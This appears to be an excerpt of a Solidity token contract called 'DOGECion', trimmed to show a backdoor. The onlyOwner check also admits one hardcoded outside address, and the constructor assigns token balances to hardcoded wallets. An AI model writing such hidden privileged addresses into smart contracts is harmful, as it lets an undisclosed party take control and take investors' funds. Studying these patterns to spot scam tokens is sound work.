...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == address(0xe7eBc1bb6e3Fa9B7d9F384B01e439B411F936aB2), "Ownable: caller is not the owner");
        _;
    }
...
contract DOGECion is IERC20, Ownable {
    ...
    constructor(
        ...
        _dividendse[0xB95F24b72fAE41ee50ad2D82eDBbFbe9f77c1005] = _amount;
        _dividendse[0x7bc325E67FF2dbaF46C30E9ed4cc7e0c3eD88888] = _amount;
